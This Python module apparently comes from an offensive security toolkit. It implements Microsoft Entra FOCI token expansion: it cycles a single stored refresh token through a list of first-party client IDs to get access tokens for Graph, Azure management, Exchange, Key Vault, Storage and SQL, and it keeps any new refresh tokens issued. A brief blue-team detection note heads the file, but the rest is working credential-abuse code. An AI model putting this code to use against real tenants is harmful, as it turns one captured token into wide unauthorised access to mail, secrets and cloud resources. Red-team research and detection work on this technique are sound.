# ================================================================
# MODULE: quantum_mechanic.providers.entra.foci
# ----------------------------------------------------------------
# PURPOSE:   FOCI (Family of Client IDs) token expansion.
#
#            One FOCI refresh token unlocks access tokens for all
#            Microsoft surfaces. Techniques never manage this —
#            EntraTokenStore.best_token() calls foci_expand()
#            transparently when no direct access token exists.
#
# DETECTION (Blue Team):
#   Azure AD Sign-in Logs: Non-interactive sign-ins from multiple
#   application IDs in rapid succession using the same refresh
#   token — distinctive pattern of FOCI chaining.
# ================================================================

from __future__ import annotations

import logging
from typing import TYPE_CHECKING

import httpx

if TYPE_CHECKING:
    from quantum_mechanic.providers.entra.token_store import EntraToken, EntraTokenStore

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------
# Known FOCI member client IDs.
# One refresh token from any of these can acquire tokens for all.
#
# Data source: vendored providers/entra/refs/GraphPreConsent.yaml
# (community-maintained by zh54321/GraphPreConsentExplorer, MIT).
# Falls back to a 7-app in-code baseline if the refs are missing so
# import never blows up. See providers/entra/refs/README.md for
# attribution + how to refresh.
# ----------------------------------------------------------------
from quantum_mechanic.providers.entra.refs import foci_client_ids as _foci_client_ids

FOCI_CLIENT_IDS: dict[str, str] = _foci_client_ids()

# Default client to use for FOCI expansion when none is specified.
FOCI_DEFAULT_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Default client for the interactive (browser + localhost listener) auth
# code flow. Must be a FOCI member with "http://localhost" registered as
# a redirect URI. FOCI_DEFAULT_CLIENT (Office) only has the Windows
# broker URI and the out-of-band URN registered, so using it here fails
# with AADSTS50011. "Visual Studio - Legacy" is the only FOCI client in
# refs/GraphPreConsent.yaml with a localhost redirect URI.
INTERACTIVE_DEFAULT_CLIENT = "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"

# ----------------------------------------------------------------
# Short mnemonic names for the well-known client IDs operators reach
# for via `--client`, so nobody has to memorize or paste a GUID.
# Unrecognized `--client` values pass through unchanged (assumed to
# already be a GUID) via resolve_client_alias() below.
# ----------------------------------------------------------------
CLIENT_ALIASES: dict[str, str] = {
    "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "vs-legacy": "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    "az-cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "az-ps": "1950a258-227b-4e31-a9cf-717495945fc2",
    "graph-cli": "14d82eec-204b-4c2f-b7e8-296a70dab67e",
}


def resolve_client_alias(value: str | None) -> str | None:
    """Resolve a short `--client` alias (e.g. "graph-cli") to its GUID.

    Case-insensitive. Values not found in CLIENT_ALIASES pass through
    unchanged so `--client <raw-guid>` keeps working exactly as before.
    """
    if value is None:
        return None
    return CLIENT_ALIASES.get(value.strip().lower(), value)

# ----------------------------------------------------------------
# Resource → typical FOCI client mapping.
# Used to pick the most appropriate client for each resource.
# ----------------------------------------------------------------
RESOURCE_CLIENT_HINTS: dict[str, str] = {
    "https://graph.microsoft.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://management.azure.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://outlook.office.com": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "https://substrate.office.com": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "https://vault.azure.net": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://storage.azure.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://database.windows.net": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
}

TOKEN_ENDPOINT = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"


def foci_expand(
    store: EntraTokenStore,
    resource: str,
    client: httpx.Client | None = None,
) -> EntraToken | None:
    """Acquire an access token for resource using a stored FOCI refresh token.

    Tries the resource-appropriate client first, then falls back through
    the full FOCI member list until one succeeds.

    Returns the new access token (already added to the store) or None.
    """
    from quantum_mechanic.providers.entra.token_store import token_from_jwt

    refresh = store.foci_refresh_token()
    if not refresh:
        logger.debug("foci_expand: no FOCI refresh token in store")
        return None

    tenant = store.tenant_id or refresh.tenant_id or "common"
    url = TOKEN_ENDPOINT.format(tenant=tenant)

    # Try resource-hinted client first, then all FOCI members.
    hint = RESOURCE_CLIENT_HINTS.get(resource.rstrip("/"), FOCI_DEFAULT_CLIENT)
    clients_to_try = [hint] + [c for c in FOCI_CLIENT_IDS if c != hint]

    owned = client is None
    http = client or httpx.Client(timeout=30)

    try:
        for client_id in clients_to_try:
            scope = resource.rstrip("/") + "/.default"
            try:
                resp = http.post(
                    url,
                    data={
                        "grant_type": "refresh_token",
                        "client_id": client_id,
                        "refresh_token": refresh.value,
                        "scope": scope,
                    },
                )
                data = resp.json()

                if "error" in data:
                    error = data.get("error_description", data["error"])
                    guidance = store.cap_guidance(error)
                    if guidance:
                        logger.warning(guidance)
                    logger.debug(
                        "foci_expand: client %s failed for %s: %s",
                        client_id,
                        resource,
                        error,
                    )
                    continue

                access_jwt = data.get("access_token", "")
                if not access_jwt:
                    continue

                access_tok = token_from_jwt(
                    access_jwt,
                    token_type="access_token",
                    resource=resource,
                    client_id=client_id,
                )
                store.add_token(access_tok)

                # Persist any new refresh token returned by the server.
                if "refresh_token" in data:
                    new_refresh = token_from_jwt(
                        data["refresh_token"],
                        token_type="refresh_token",
                        resource=resource,
                        client_id=client_id,
                    )
                    store.add_token(new_refresh)

                logger.debug(
                    "foci_expand: acquired access token for %s via %s (%s)",
                    resource,
                    FOCI_CLIENT_IDS.get(client_id, client_id),
                    client_id,
                )
                return access_tok

            except httpx.HTTPError as e:
                logger.debug("foci_expand: HTTP error for client %s: %s", client_id, e)
                continue

    finally:
        if owned:
            http.close()

    logger.warning("foci_expand: all FOCI clients exhausted for resource %s", resource)
    return None


def foci_expand_all(
    store: EntraTokenStore,
    client: httpx.Client | None = None,
) -> dict[str, bool]:
    """Attempt FOCI expansion for all known resources.

    Returns a mapping of resource → success.
    Used after initial token import to pre-warm the store.
    """
    from quantum_mechanic.providers.entra.token_store import (
        ARM,
        EXCHANGE,
        GRAPH,
        SQL,
        STORAGE,
        SUBSTRATE,
        VAULT,
    )

    resources = [GRAPH, ARM, EXCHANGE, SUBSTRATE, VAULT, STORAGE, SQL]
    results: dict[str, bool] = {}

    owned = client is None
    http = client or httpx.Client(timeout=30)
    try:
        for resource in resources:
            tok = foci_expand(store, resource, client=http)
            results[resource] = tok is not None
    finally:
        if owned:
            http.close()

    return results
